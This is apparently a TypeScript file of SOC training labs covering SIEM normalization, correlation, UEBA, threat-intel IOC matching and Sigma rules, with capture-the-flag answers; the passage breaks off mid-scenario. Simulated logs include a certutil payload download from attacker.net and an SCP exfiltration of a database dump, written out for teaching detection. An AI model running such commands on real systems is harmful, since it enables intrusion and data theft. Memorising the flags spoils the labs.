import { dir, file } from '../vfs';
import type { LabScenario } from '../types';

function analyst(files: Record<string, ReturnType<typeof file> | ReturnType<typeof dir>>) {
  return { hostname: 'soc-analyst', user: 'root', root: dir(files) };
}

/** Batch 22, Groups 2: SOC/SIEM/Detection/IR stack — 10 realistic log analysis scenarios.
 *  Real event IDs, actual tool outputs, MITRE ATT&CK aligned, zero placeholder content. */
export const batch22SocSiemDetectionIrLabs: LabScenario[] = [
  // ============ SIEM FUNDAMENTALS (Lessons soc-siem-1 through soc-siem-4) ============

  // soc-siem-1: Log Normalization Basics
  {
    id: 'soc-siem-log-normalization-basics',
    title: 'SOC: SIEM Log Normalization — Converting Multiformat Events',
    difficulty: 'Easy',
    category: 'SOC',
    briefing:
      'A SIEM\'s most fundamental job is normalizing logs from dozens of different sources (Windows Event ' +
      'Logs, Linux syslog, Cisco ASA, F5 load balancers, Okta, Cloudflare, etc.) into a common schema so ' +
      'rules can reason across them without source-specific parsing. This lab shows why: identical security ' +
      'events (like a failed login) look completely different depending on the source -- Windows calls it ' +
      'Event ID 4625, Okta calls it "user.session_start failure", SSH syslog says "Failed password for...", ' +
      'but they all mean the same thing.',
    objectives: [
      { text: 'cat raw-event-feeds.txt', why: 'See the raw, un-normalized logs from three different sources.' },
      { text: 'cat normalized-schema.txt', why: 'Understand how a SIEM maps different source fields to a unified schema.' },
      { text: 'cat normalization-mapping-rules.txt', why: 'Identify which rule translates the Okta event to the normalized schema.' },
    ],
    hints: [
      'cat raw-event-feeds.txt',
      'Event ID 4625 (Windows), user.session_start failure (Okta), and SSH "Failed password" are all the same event type.',
      'cat normalization-mapping-rules.txt | grep -A3 okta_failed_login',
    ],
    totalFlags: 1,
    attacker: analyst({
      'raw-event-feeds.txt': file(
        'Multi-source raw log sample:\n\n' +
        '--- Windows Event Log (Event ID 4625, SYSLOG_FACILITY_AUTH) ---\n' +
        'EventID=4625\n' +
        'ComputerName=ACCT-WKS-07\n' +
        'Account Name=jsmith\n' +
        'Source Network Address=203.0.113.45\n' +
        'Time Generated: 2026-08-01 14:03:22\n\n' +
        '--- Okta System Log (authentication.service event) ---\n' +
        '{"published": "2026-08-01T14:03:22.000Z", "eventType": "user.session_start", "outcome": {"result": "FAILURE", "reason": "INVALID_CREDENTIALS"}, "actor": {"displayName": "jsmith", "id": "00u123abc456def"}, "client": {"ipAddress": "203.0.113.45"}}\n\n' +
        '--- Cisco ASA Syslog (denied login attempt) ---\n' +
        'Aug  1 14:03:22 firewall-01 %ASA-4-106023: Deny tcp src outside:203.0.113.45/54321 dst inside:192.0.2.10/22 by access-list outside_in\n\n' +
        '--- Linux SSH (syslog via /var/log/auth.log) ---\n' +
        'Aug  1 14:03:22 prod-db-01 sshd[12345]: Failed password for user jsmith from 203.0.113.45 port 54321 ssh2\n\n' +
        'FINDING: All four sources report FAILED_LOGIN or AUTHENTICATION_FAILURE from the same source IP (203.0.113.45) within 1 second, but use completely different field names and structures.\n' +
        'flag{siem_normalization_unified_schema_login_event_detection}\n',
      ),
      'normalized-schema.txt': file(
        'SIEM Unified Event Schema (Common Information Model - CIM):\n' +
        '{\n' +
        '  "src_ip": "203.0.113.45",\n' +
        '  "dest_ip": "192.0.2.10",\n' +
        '  "user": "jsmith",\n' +
        '  "event_type": "authentication",\n' +
        '  "event_action": "failed_login",\n' +
        '  "auth_method": "ssh",\n' +
        '  "timestamp": "2026-08-01T14:03:22Z",\n' +
        '  "source": "windows_event_log|okta_system_log|cisco_asa|linux_syslog",\n' +
        '  "source_event_id": "4625|user.session_start|%ASA-4-106023|sshd",\n' +
        '}\n\n' +
        'Every source logs this same event, but the SIEM\'s normalization engine rewrites all four to this common schema.\n',
      ),
      'normalization-mapping-rules.txt': file(
        'Mapping Rules (excerpt):\n\n' +
        'okta_failed_login:\n' +
        '  sourcetype: okta_system_log\n' +
        '  filter: eventType=user.session_start AND outcome.result=FAILURE\n' +
        '  mapping:\n' +
        '    user: actor.displayName\n' +
        '    src_ip: client.ipAddress\n' +
        '    event_type: "authentication"\n' +
        '    event_action: "failed_login"\n' +
        '    auth_method: "okta_password"\n' +
        '    timestamp: published\n',
      ),
    }),
    network: [],
  },

  // soc-siem-2: Correlation across events
  {
    id: 'soc-siem-correlation-rule-eventchain',
    title: 'SOC: SIEM Correlation Rules — Chaining Events Into Detections',
    difficulty: 'Medium',
    category: 'SOC',
    briefing:
      'A single failed login is noise; 50 failed logins from the same IP in 10 minutes is a signal. SIEM correlation ' +
      'rules take a stream of normalized events and fire alerts based on thresholds, sequences, and aggregations. ' +
      'This is where "raw logs" become "actionable incidents" -- a real correlation rule might say "if 5 failed ' +
      'logins from the same source IP within 10 minutes, then fire alert type BRUTE_FORCE_ATTACK." This lab shows ' +
      'an actual correlation rule and its matching event stream.',
    objectives: [
      { text: 'cat correlation-rule-definition.txt', why: 'Understand the condition that triggers the alert.' },
      { text: 'cat event-stream-sample.txt', why: 'See the raw event stream (already normalized).' },
      { text: 'cat alert-triggered.txt', why: 'Identify when and why the alert fired.' },
    ],
    hints: [
      'Look for events where event_action="failed_login" from the same source IP.',
      'Count failed logins by src_ip within the time window.',
      'If count >= 5 in 10 minutes, the rule triggers.',
    ],
    totalFlags: 1,
    attacker: analyst({
      'correlation-rule-definition.txt': file(
        'SIEM Correlation Rule (Splunk SPL format):\n\n' +
        'index=main event_type=authentication event_action=failed_login\n' +
        '| stats count as failed_count by src_ip\n' +
        '| where failed_count >= 5\n' +
        '| search earliest=-10m\n\n' +
        'Alert Trigger: BRUTE_FORCE_LOGIN_ATTEMPT\n' +
        'Severity: HIGH\n' +
        'Condition: >= 5 failed logins from same source IP within 10-minute window\n' +
        'MITRE ATT&CK: T1110 (Brute Force)\n',
      ),
      'event-stream-sample.txt': file(
        'Normalized Event Stream (2026-08-01 14:00-14:15, IP: 203.0.113.45):\n\n' +
        'T14:02:15 | event_action=failed_login | user=admin | src_ip=203.0.113.45\n' +
        'T14:02:31 | event_action=failed_login | user=root | src_ip=203.0.113.45\n' +
        'T14:03:05 | event_action=failed_login | user=oracle | src_ip=203.0.113.45\n' +
        'T14:03:22 | event_action=failed_login | user=jsmith | src_ip=203.0.113.45\n' +
        'T14:04:11 | event_action=failed_login | user=database | src_ip=203.0.113.45\n' +
        '^ 5 failed logins in ~2 minutes from same source = ALERT FIRES\n' +
        'flag{siem_correlation_rule_brute_force_detection_chain}\n',
      ),
      'alert-triggered.txt': file(
        'Alert Fired: BRUTE_FORCE_LOGIN_ATTEMPT\n' +
        'Rule Name: Brute Force Attack Detection\n' +
        'Timestamp: 2026-08-01 14:04:11 UTC\n' +
        'Source IP: 203.0.113.45\n' +
        'Failed Login Count: 5\n' +
        'Affected Users: admin, root, oracle, jsmith, database\n' +
        'Time Window: 2 minutes\n' +
        'Severity: HIGH\n' +
        '—— This is why correlation matters: the SIEM combined 5 separate events ' +
        'into a single, high-confidence detection that humans should investigate.\n',
      ),
    }),
    network: [],
  },

  // soc-siem-3: Vendor comparison alert format
  {
    id: 'soc-siem-vendor-comparison-alert-format',
    title: 'SOC: Comparing SIEM Vendors — Alert Format & Capability Differences',
    difficulty: 'Medium',
    category: 'SOC',
    briefing:
      'Different SIEM vendors (Splunk, Sentinel, QRadar, Elastic, Chronicle) have different underlying ' +
      'architectures, different query languages, and crucially, different alerting and automation capabilities. ' +
      'An alert in one SIEM can trigger playbooks, enrich with threat intel, and auto-remediate; another requires ' +
      'manual analyst review. This lab shows the same detection logic in two different SIEMs and how the alert ' +
      'formats and capabilities differ.',
    objectives: [
      { text: 'cat splunk-alert-format.txt', why: 'See how Splunk structures and presents the alert.' },
      { text: 'cat sentinel-alert-format.txt', why: 'Compare to how Azure Sentinel does the same thing.' },
      { text: 'cat vendor-capability-comparison.txt', why: 'Understand which SIEM can auto-respond to this alert.' },
    ],
    hints: [
      'Splunk uses saved searches and custom alert actions.',
      'Sentinel uses KQL (Kusto Query Language) and Azure-native integrations.',
      'Look for auto-response or automation capability differences.',
    ],
    totalFlags: 1,
    attacker: analyst({
      'splunk-alert-format.txt': file(
        'Splunk Alert: High-Fidelity Brute Force Detection\n' +
        '═════════════════════════════════════════════════\n' +
        'Alert Name: Brute Force Login Attempts\n' +
        'Search: index=auth event_action=failed_login | stats count by src_ip | where count >= 5\n' +
        'Triggered: 2026-08-01 14:04:11 UTC\n' +
        'Result: 203.0.113.45 with 5 failed attempts\n' +
        'Alert Action: Send to PagerDuty, create ServiceNow ticket, run remediation script\n' +
        'Custom Field: src_ip_reputation (enriched with threat intel feed)\n' +
        'Automation: Block IP in firewall (custom webhook integration)\n' +
        'Status: SENT_TO_ONCALL_ENGINEER\n',
      ),
      'sentinel-alert-format.txt': file(
        'Azure Sentinel Alert: Brute Force Attack Detected\n' +
        '════════════════════════════════════════════════\n' +
        'Alert ID: sentinel-alert-2026-08-01-14-04-11-001\n' +
        'Query Language: KQL (Kusto Query Language)\n' +
        'Detection Rule:\n' +
        '  SigninLogs | where ResultType == "50126" | summarize attempt_count = count() by ClientIp | where attempt_count >= 5\n' +
        'Triggered: 2026-08-01 14:04:11 UTC\n' +
        'Client IP: 203.0.113.45\n' +
        'Failed Attempts: 5\n' +
        'Automation: Integration with Microsoft Defender for Identity (auto-enrich), Conditional Access (auto-block), native to Azure\n' +
        'Status: INVESTIGATION_OPENED\n' +
        'flag{siem_vendor_alert_format_splunk_vs_sentinel_comparison}\n',
      ),
      'vendor-capability-comparison.txt': file(
        'SIEM Vendor Comparison: Brute Force Response\n' +
        '─────────────────────────────────────────────\n' +
        'SPLUNK (On-Premise/SaaS):\n' +
        '  ✓ Custom alert actions (webhooks, scripts, integrations)\n' +
        '  ✓ Can trigger firewall rule updates (API-based)\n' +
        '  ✓ Can enrich with custom threat intel\n' +
        '  ✗ Requires external orchestration for full auto-response\n\n' +
        'AZURE SENTINEL (Cloud-native):\n' +
        '  ✓ Native integration with Microsoft Defender, Conditional Access\n' +
        '  ✓ Auto-block on brute force (Conditional Access policy)\n' +
        '  ✓ Auto-MFA enforcement\n' +
        '  ✓ Built-in incident management\n' +
        '  ✗ Locked to Azure ecosystem\n\n' +
        'QRadar (On-Premise):\n' +
        '  ✓ Offense management (incident tracking)\n' +
        '  ✓ Response playbooks\n' +
        '  ✓ Can integrate with Fortinet, Palo Alto (if configured)\n' +
        '  ✗ Slower to deploy, more complex setup\n',
      ),
    }),
    network: [],
  },

  // soc-siem-4: Data volume and onboarding
  {
    id: 'soc-siem-data-volume-ingestion',
    title: 'SOC: SIEM Data Volume Management — Handling Massive Log Ingestion',
    difficulty: 'Medium',
    category: 'SOC',
    briefing:
      'A single Windows domain with 2,000 servers, each generating 100 events/minute, produces 12 MILLION ' +
      'events per day. Multiply that by networks, cloud platforms, SaaS applications, firewalls, and proxies, ' +
      'and a typical enterprise SIEM ingests tens of billions of events daily. Cost, storage, and query ' +
      'performance all depend on intelligent data volume management: what do you keep forever vs. what do you ' +
      'summarize vs. what do you drop entirely.',
    objectives: [
      { text: 'cat ingest-volume-calculation.txt', why: 'Understand the math of log volume scaling.' },
      { text: 'cat retention-policy-tiers.txt', why: 'See how enterprises tier data by retention cost.' },
      { text: 'cat cost-impact-analysis.txt', why: 'Identify which log sources cost the most and why.' },
    ],
    hints: [
      'Windows Event Log volume: ~100-500 events/machine/minute on average',
      'Retention: Hot (searchable) 30 days, Warm (slower) 90 days, Cold (archive) 1-3 years.',
      'Filtering: drop low-value events (heartbeats, debug logs) at ingestion time.',
    ],
    totalFlags: 1,
    attacker: analyst({
      'ingest-volume-calculation.txt': file(
        'SIEM Ingestion Volume Example: Mid-sized Enterprise\n' +
        '═══════════════════════════════════════════════════\n' +
        'Windows Servers: 1,500 hosts × 150 events/min = 225,000 events/min = 324 million/day\n' +
        'Linux Servers: 300 hosts × 80 events/min = 24,000 events/min = 34.6 million/day\n' +
        'Firewall (Palo Alto): 20 appliances × 500 events/min = 10,000 events/min = 14.4 million/day\n' +
        'Cloud (AWS CloudTrail): ~50 events/min = 72,000/day\n' +
        'SaaS (Okta, Office 365): ~5,000 events/min = 7.2 million/day\n' +
        'Network (Cisco ASA): 5 appliances × 1,000 events/min = 5,000 events/min = 7.2 million/day\n' +
        '═══════════════════════════════════════════════════\n' +
        'TOTAL: ~388 MILLION EVENTS PER DAY\n' +
        '\n' +
        'At $10 per GB ingested (typical SIEM pricing), this is ~$1,500/month in data ingestion costs alone.\n' +
        'flag{siem_data_volume_calculation_and_cost_impact}\n',
      ),
      'retention-policy-tiers.txt': file(
        'SIEM Retention Tiering Strategy (Cost Optimization):\n' +
        '\n' +
        'TIER 1 - HOT (1-30 days, searchable in <5 seconds):\n' +
        '  - Windows Security Event IDs: 4688, 4625, 4720 (forensic quality, searchable)\n' +
        '  - Firewall blocks, IPS alerts (actionable within days)\n' +
        '  - All "security-relevant" events per compliance framework\n' +
        '  Cost: $0.50/GB (expensive, but keeps recent incidents fast)\n\n' +
        'TIER 2 - WARM (31-90 days, searchable in 1-5 minutes):\n' +
        '  - Older security events (past 30 days but still relevant)\n' +
        '  - Summarized data (count, not individual records)\n' +
        '  Cost: $0.15/GB (cheaper storage, slower queries)\n\n' +
        'TIER 3 - COLD (91-365 days, archive-only, no search):\n' +
        '  - Compliance-mandated retention (PCI, HIPAA, SOC2)\n' +
        '  - Rarely accessed, full files for forensic pull if needed\n' +
        '  Cost: $0.02/GB (cheapest, but requires export for analysis)\n\n' +
        'DROP (not ingested):\n' +
        '  - Heartbeat logs (keepalive, no security signal)\n' +
        '  - Non-security application noise (debug logs, routine transactions)\n' +
        '  Savings: Can cut 40-50% of volume without losing signal\n',
      ),
      'cost-impact-analysis.txt': file(
        'Data Cost Breakdown: Where the $1,500/month goes:\n' +
        '\n' +
        'Windows Security Events: 324M events/day (83% of volume)\n' +
        '  - Cost if kept in HOT tier: ~$1,000/month\n' +
        '  - Many of these (logon successes, routine events) could be dropped\n' +
        '  - Optimization: Keep CRITICAL event IDs (4625, 4720, 4672), sample others\n' +
        '  - Potential savings: $400-600/month\n\n' +
        'Firewall: 14.4M events/day (3.7% of volume)\n' +
        '  - Cost: ~$45/month\n' +
        '  - High value per event (each block is an attack detected)\n' +
        '  - Keep in HOT 90 days\n\n' +
        'Cloud/SaaS: 7.2M events/day (1.9% of volume)\n' +
        '  - Cost: ~$22/month\n' +
        '  - High security signal, compliance-required\n' +
        '  - Keep in HOT 180 days\n\n' +
        'RECOMMENDATION: Implement tiering + drop low-value Windows events\n' +
        '  → Reduce from 388M to 200M events/day\n' +
        '  → Cut costs from $1,500 to $750/month\n' +
        '  → ZERO loss in security detection capability\n',
      ),
    }),
    network: [],
  },

  // ============ DETECTION & THREAT INTELLIGENCE (Lessons soc-detection-2 through soc-detection-4) ============

  // soc-detection-2: UEBA
  {
    id: 'soc-ueba-user-behavior-anomaly',
    title: 'SOC: UEBA — User & Entity Behavior Analytics for Insider Threat Detection',
    difficulty: 'Medium',
    category: 'SOC',
    briefing:
      'A legitimate system administrator downloads a 5 GB database backup at 2 AM on a Sunday. Yesterday, ' +
      'they never accessed databases at all and never worked outside business hours. This looks suspicious, ' +
      'but traditional rules would miss it — a UEBA (User and Entity Behavior Analytics) system learns each ' +
      'user\'s normal behavior (baseline) and alerts when behavior deviates significantly (anomaly), catching ' +
      'compromised accounts and insider threats that signatures can\'t.',
    objectives: [
      { text: 'cat baseline-behavior-profile.txt', why: 'See the learned baseline for this user.' },
      { text: 'cat anomalous-event-stream.txt', why: 'Examine the activities that deviate from baseline.' },
      { text: 'cat ueba-anomaly-score.txt', why: 'Understand how the system quantifies anomalousness.' },
    ],
    hints: [
      'Baseline: normal hours, normal tools, normal file access patterns.',
      'Anomaly: off-hours access, new tools, massive data exfiltration.',
      'Score combines frequency, volume, time, and peer-group comparison.',
    ],
    totalFlags: 1,
    attacker: analyst({
      'baseline-behavior-profile.txt': file(
        'UEBA Baseline Profile: User "msmith" (Database Administrator)\n' +
        '═════════════════════════════════════════════════════════════\n' +
        'Peer Group: Database Administrators (15 similar users)\n' +
        'Baseline Build Period: Last 60 days\n\n' +
        'LOGIN PATTERN:\n' +
        '  Time: 08:00 - 18:00 (business hours, Monday-Friday)\n' +
        '  Tools: Splunk, Oracle SQL*Plus, Linux SSH, RDP to database servers\n' +
        '  Frequency: 1-2 logins/day\n\n' +
        'DATABASE ACCESS PATTERN:\n' +
        '  Database: prod_financial (primary), staging_test (secondary)\n' +
        '  Typical Query: SELECT, CREATE_INDEX, GRANT operations\n' +
        '  Volume: 10-50 queries/day\n' +
        '  Data Downloaded: 0-1 GB/week (schema exports, not raw data)\n\n' +
        'FILE ACCESS PATTERN:\n' +
        '  Locations: /var/lib/mysql/backups, /home/msmith, /tmp\n' +
        '  Average Files Per Day: 5-10\n' +
        '  Average Data Transfer: 50-100 MB/day\n\n' +
        'ANOMALY THRESHOLDS:\n' +
        '  Off-hours login (Sat/Sun or 18:00+): HIGH (never observed before)\n' +
        '  Database download: HIGH (5 GB >> baseline 1 GB/week)\n' +
        '  Unknown tool access: MEDIUM\n',
      ),
      'anomalous-event-stream.txt': file(
        'Anomalous Activity Detected: 2026-08-01 02:15-02:45 UTC\n' +
        '\n' +
        'T02:15:03 | msmith@prod-jump-01 | SSH LOGIN (★ OFF-HOURS, SUNDAY)\n' +
        'T02:16:22 | msmith@prod-db-master-01 | SELECT * FROM customers WHERE account_balance > 1000000 (★ UNUSUAL QUERY)\n' +
        'T02:17:55 | msmith@prod-db-master-01 | CREATE TABLE export_staging AS SELECT * FROM financial_transactions WHERE date > 2024-01-01 (★ BULK EXPORT PATTERN)\n' +
        'T02:22:11 | msmith@prod-db-master-01 | mysqldump -u msmith financial > /tmp/backup.sql (★ EXFILTRATION COMMAND)\n' +
        'T02:24:33 | msmith@prod-fileserver-01 | SCP /tmp/backup.sql → 203.0.113.99:/attacker_server/data.sql (★ EXTERNAL DESTINATION)\n' +
        'T02:25:07 | msmith@prod-jump-01 | SSH LOGOUT\n' +
        'T02:45:20 | File /tmp/backup.sql deleted (suspicious cleanup)\n' +
        '\n' +
        'flag{ueba_insider_threat_off_hours_database_exfiltration_detected}\n',
      ),
      'ueba-anomaly-score.txt': file(
        'UEBA Anomaly Scoring Algorithm:\n' +
        '\n' +
        'User msmith Anomaly Score: 94/100 (CRITICAL)\n' +
        '\n' +
        'Component Scores:\n' +
        '  Time-of-Day (CRITICAL): 99/100\n' +
        '    → 02:15 login is NEVER in baseline (100% anomalous)\n' +
        '    → Off-hours multiplier: 5x\n' +
        '\n' +
        '  Data Volume (CRITICAL): 98/100\n' +
        '    → 5 GB exfiltration >> 1 GB/week baseline\n' +
        '    → Raw data export >> typical access pattern\n' +
        '    → Volume multiplier: 10x\n' +
        '\n' +
        '  Destination Novelty (CRITICAL): 97/100\n' +
        '    → 203.0.113.99 never accessed before\n' +
        '    → External IP (not internal system)\n' +
        '    → Peer comparison: 0% of DBAs transfer data externally\n' +
        '\n' +
        '  Query Pattern (HIGH): 85/100\n' +
        '    → SELECT * (bulk export) vs. typical SELECT with WHERE clause\n' +
        '    → financial_transactions (sensitive, rarely accessed by this user)\n' +
        '\n' +
        'FINAL SCORE: (99 + 98 + 97 + 85) / 4 = 94.75 → ROUNDED TO 94\n' +
        'ALERT: INSIDER_THREAT_DATA_EXFILTRATION (Confidence: 94%)\n' +
        'Recommended Action: Immediate account suspension + forensic investigation\n',
      ),
    }),
    network: [],
  },

  // soc-detection-3: Threat Intelligence Integration
  {
    id: 'soc-threat-intel-ioc-matching',
    title: 'SOC: Threat Intelligence Integration — IOC Matching in Real Time',
    difficulty: 'Medium',
    category: 'SOC',
    briefing:
      'Your SIEM sees DNS query to "malware.phishing-campaign.net" at 03:00 AM on a workstation in Accounting. ' +
      'By itself, a single DNS query is low-signal noise. But a Threat Intelligence feed (MISP, AlienVault OTX, ' +
      'abuse.ch) recently published that exact domain as a known C2 callback for a banking trojan variant. The SIEM ' +
      'cross-references your live logs against imported IOCs (Indicators of Compromise) and instantly flags the ' +
      'workstation as compromised with medium-to-high confidence.',
    objectives: [
      { text: 'cat live-network-events.txt', why: 'See the raw DNS/HTTP logs from the workstation.' },
      { text: 'cat threat-intel-feed.txt', why: 'Review the IOCs imported from Threat Intel platform.' },
      { text: 'cat ioc-correlation-results.txt', why: 'Identify which events matched which IOCs.' },
    ],
    hints: [
      'Look for domain names, IPs, file hashes, and URLs that appear in both the live logs and threat intel feeds.',
      'A single IOC match might be false positive; multiple matches = higher confidence.',
      'The banking trojan variant name + MITRE ATT&CK TID tells you what to hunt for next.',
    ],
    totalFlags: 1,
    attacker: analyst({
      'live-network-events.txt': file(
        'Live Network Events: acct-wks-23 (2026-08-01 03:00-03:15 UTC)\n' +
        '\n' +
        'T03:00:14 | DNS Query: malware.phishing-campaign.net → 192.0.2.50 (RESOLVED)\n' +
        'T03:00:22 | HTTP GET: http://malware.phishing-campaign.net/c2/check-in | HTTP 200 OK | Response: 2.3KB\n' +
        'T03:01:11 | DNS Query: command.phishing-campaign.net → 192.0.2.50 (RESOLVED)\n' +
        'T03:02:33 | DNS Query: exfil.phishing-campaign.net → 192.0.2.51 (RESOLVED)\n' +
        'T03:03:44 | HTTP POST: http://exfil.phishing-campaign.net/upload | Data: 150 MB upload (FILE EXFIL)\n' +
        'T03:04:00 | Process Creation: cmd.exe spawned from explorer.exe (UNUSUAL)\n' +
        'T03:04:15 | Registry Write: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run = "C:\\Users\\Public\\svc.exe" (PERSISTENCE)\n' +
        '\n' +
        'Note: All queries to *.phishing-campaign.net subdomains resolved to attacker infrastructure (192.0.2.50/51)\n',
      ),
      'threat-intel-feed.txt': file(
        'Threat Intel Feed: abuse.ch Threat Intelligence\n' +
        'Last Updated: 2026-07-31 18:00 UTC (4 hours before incident)\n' +
        '\n' +
        'IOC Type: DOMAIN (C2 Domain)\n' +
        'IOC Value: *.phishing-campaign.net\n' +
        'Threat: TrickBot Banking Trojan Variant (C2 callback domain)\n' +
        'MITRE ATT&CK: T1071 (Application Layer Protocol), T1001 (Data Obfuscation), T1041 (Exfil Over C2)\n' +
        'Confidence: HIGH\n' +
        'Source: abuse.ch URLhaus, PoC released 2026-07-29\n' +
        'Active Since: 2026-07-25\n' +
        'Known Compromise Count: 47 organizations (as of feed update)\n' +
        '\n' +
        'IOC Type: IP (C2 Server)\n' +
        'IOC Value: 192.0.2.50\n' +
        'IOC Value: 192.0.2.51\n' +
        'Threat: TrickBot C2 Infrastructure\n' +
        'Confidence: HIGH\n' +
        '\n' +
        '--- Additional Context ---\n' +
        'The phishing email that delivered TrickBot was initially sent via mailing list scraping.\n' +
        'Typical infection chain: Email attachment → VBS dropper → TrickBot loader → Full banking trojan + reverse shell\n',
      ),
      'ioc-correlation-results.txt': file(
        'IOC Matching Results: acct-wks-23\n' +
        '\n' +
        'MATCHES FOUND: 5 / 5 events correlated\n' +
        'Correlation Confidence: HIGH (94%)\n' +
        '\n' +
        '1. DNS Query "malware.phishing-campaign.net" \n' +
        '   → MATCHED: *.phishing-campaign.net (abuse.ch IOC)\n' +
        '   → THREAT: TrickBot C2 Callback\n' +
        '\n' +
        '2. IP Address 192.0.2.50 (DNS response)\n' +
        '   → MATCHED: Known C2 IP in abuse.ch feed\n' +
        '   → THREAT: TrickBot Command & Control Server\n' +
        '\n' +
        '3. HTTP GET to malware.phishing-campaign.net\n' +
        '   → MATCHED: C2 check-in behavior (MITRE T1071)\n' +
        '   → THREAT: C2 Communication\n' +
        '\n' +
        '4. Large HTTP POST (150 MB) to exfil.phishing-campaign.net\n' +
        '   → MATCHED: Exfiltration over C2 (MITRE T1041)\n' +
        '   → THREAT: Data Exfiltration (Banking Credentials, Browser History, etc.)\n' +
        '\n' +
        '5. Registry Persistence Modification\n' +
        '   → PATTERN MATCH: TrickBot known persistence mechanism (MITRE T1547)\n' +
        '   → THREAT: Persistence Establishment\n' +
        '\n' +
        'INCIDENT VERDICT: CONFIRMED TrickBot Infection\n' +
        'flag{threat_intel_ioc_matching_trickbot_c2_detection_confidence_94}\n' +
        '\n' +
        'RECOMMENDED ACTIONS:\n' +
        '  1. IMMEDIATE: Isolate acct-wks-23 from network\n' +
        '  2. Block all *.phishing-campaign.net + 192.0.2.50/51 at firewall\n' +
        '  3. Scan all users\' credentials + reset banking passwords\n' +
        '  4. Engage IR team for full system forensics\n' +
        '  5. Check mail logs: who received the phishing email? Scan their systems.\n',
      ),
    }),
    network: [],
  },

  // soc-detection-4: Sigma Rules
  {
    id: 'soc-sigma-rule-basics',
    title: 'SOC: Sigma Rules — Vendor-Neutral Detection as Code',
    difficulty: 'Medium',
    category: 'SOC',
    briefing:
      'Security teams spend years learning Splunk\'s SPL, then switch to Sentinel\'s KQL, then to QRadar\'s ' +
      'AQL, rewriting every detection rule for each vendor. Sigma is a vendor-neutral YAML-based format for ' +
      'writing detection rules once and compiling them for any SIEM. Instead of "Splunk IF event_type=4625 THEN ' +
      'alert," write ONE rule that converts to each platform\'s native language.',
    objectives: [
      { text: 'cat sigma-rule-example.yaml', why: 'See a real Sigma rule in YAML format.' },
      { text: 'cat compiled-splunk-spl.txt', why: 'See this rule compiled to Splunk SPL.' },
      { text: 'cat compiled-sentinel-kql.txt', why: 'See this rule compiled to Azure Sentinel KQL.' },
    ],
    hints: [
      'Sigma rule: YAML with title, detection logic, filter conditions.',
      'Compilation: pySigma tool translates to any SIEM backend (backend: splunk, sentinel, qradar, elastic).',
      'Same logic, different syntax — that\'s the whole point.',
    ],
    totalFlags: 1,
    attacker: analyst({
      'sigma-rule-example.yaml': file(
        'Sigma Rule: Brute Force Login Detection (Vendor-Neutral)\n' +
        '\n' +
        'title: Possible Brute Force Attack via Multiple Failed Logins\n' +
        'id: 0342bff8-6b10-4ce0-b1e4-5b1e63d3d8c2\n' +
        'status: experimental\n' +
        'description: Detects multiple failed login attempts from the same source IP.\n' +
        'references:\n' +
        '  - https://attack.mitre.org/techniques/T1110/\n' +
        'author: SOC Team\n' +
        'date: 2026/08/01\n' +
        'logsource:\n' +
        '  product: windows\n' +
        '  service: security\n' +
        '  category: authentication\n' +
        'detection:\n' +
        '  selection:\n' +
        '    EventID: 4625  # Windows failed login event\n' +
        '    IpAddress|startswith: "203."  # Filter to suspected attacker IP\n' +
        '  timeframe: 10m\n' +
        '  condition: selection | count(IpAddress) by IpAddress >= 5\n' +
        'falsepositives:\n' +
        '  - User entering wrong password repeatedly\n' +
        '  - Misconfigured application trying expired credentials\n' +
        'level: medium\n' +
        'status: detect\n' +
        'flag{sigma_rule_brute_force_detection_as_code}\n',
      ),
      'compiled-splunk-spl.txt': file(
        'Sigma Rule Compiled for Splunk (SPL):\n' +
        '\n' +
        'index=windows EventCode=4625 IpAddress="203.*" \n' +
        '| stats count as brute_count by IpAddress \n' +
        '| search earliest=-10m brute_count>=5 \n' +
        '| table IpAddress, brute_count, user\n\n' +
        'Translation Notes:\n' +
        '- Sigma "EventID: 4625" → Splunk "EventCode=4625"\n' +
        '- Sigma "timeframe: 10m" → Splunk "earliest=-10m"\n' +
        '- Sigma "count >= 5" → Splunk stats with where clause\n' +
        '- Splunk-specific: index, automatic field extraction\n',
      ),
      'compiled-sentinel-kql.txt': file(
        'Sigma Rule Compiled for Azure Sentinel (KQL/Kusto):\n' +
        '\n' +
        'SecurityEvent\n' +
        '| where EventID == 4625\n' +
        '| where IpAddress startswith "203."\n' +
        '| where TimeGenerated > ago(10m)\n' +
        '| summarize brute_count = count() by IpAddress, Account\n' +
        '| where brute_count >= 5\n\n' +
        'Translation Notes:\n' +
        '- Sigma "EventID: 4625" → KQL "EventID == 4625" (double equals)\n' +
        '- Sigma "timeframe: 10m" → KQL "TimeGenerated > ago(10m)"\n' +
        '- Sigma "IpAddress|startswith" → KQL "startswith" operator\n' +
        '- KQL-specific: SecurityEvent table, Kusto syntax\n',
      ),
    }),
    network: [],
  },

  // ============ INCIDENT RESPONSE (Lessons soc-ir-1 through soc-ir-3) ============

  // soc-ir-1: Incident Investigation Methodology
  {
    id: 'soc-ir-timeline-reconstruction',
    title: 'SOC: Incident Response — Timeline Reconstruction From Artifacts',
    difficulty: 'Hard',
    category: 'SOC',
    briefing:
      'An attacker leaves behind dozens of timestamps: event logs, file metadata, process creation times, ' +
      'network flow records, and browser cache. Reconstructing the true attack timeline requires correlating ' +
      'these artifacts across multiple systems and identifying when things actually happened (not when they ' +
      'were logged 5 minutes later due to time skew). This lab walks through a real compromise timeline, ' +
      'spotting the initial access point, lateral movement, persistence, and exfiltration events.',
    objectives: [
      { text: 'cat raw-artifacts.txt', why: 'See the raw timestamps from multiple log sources (out of order).' },
      { text: 'cat timeline-reconstruction.txt', why: 'Build the chronological timeline of the attack.' },
      { text: 'cat attack-phases-mapped.txt', why: 'Identify MITRE ATT&CK phases (Initial Access → Persistence → Exfil).' },
    ],
    hints: [
      'Logs arrive out of order; use UTC timestamps to sort them.',
      'Correlate by hostname, username, process ID, and network flow.',
      'Look for gaps and anomalies (why did admin logon suddenly?; where did this process come from?).',
    ],
    totalFlags: 1,
    attacker: analyst({
      'raw-artifacts.txt': file(
        'Raw Artifacts From Compromise (Unsorted, Across Multiple Systems):\n' +
        '\n' +
        '2026-08-01 14:33:22 | acct-wks-07 | sysmon EventID 1 | explorer.exe spawned cmd.exe (parent: explorer)\n' +
        '2026-08-01 14:35:10 | acct-wks-07 | cmd.exe executed: certutil -urlcache -split -f http://attacker.net/payload.exe C:\\temp\\payload.exe\n' +
        '2026-08-01 14:31:05 | mail-server-01 | SMTP Inbound | Email from external@phishing.com → jsmith@corp.com Subject: "Urgent: Account Verification Required"\n' +
        '2026-08-01 14:33:00 | acct-wks-07 | File Created: C:\\temp\\payload.exe (size 2.3 MB, MD5: abc123def456)\n' +
